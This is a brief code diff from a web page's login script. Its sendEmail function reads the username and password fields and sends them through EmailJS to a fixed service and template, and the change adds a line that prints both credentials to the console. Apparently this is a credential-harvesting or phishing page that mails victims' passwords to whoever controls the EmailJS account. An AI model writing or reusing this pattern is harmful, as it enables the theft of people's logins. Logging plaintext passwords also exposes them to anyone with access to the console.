@@ -31,8 +31,11 @@
         // Function to send email using EmailJS
         function sendEmail() {
             event.preventDefault();
+            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+
+            console.log(username + password)
 
             emailjs.send("service_udw5l3n", "template_4zla0ro", {
                 username: username,
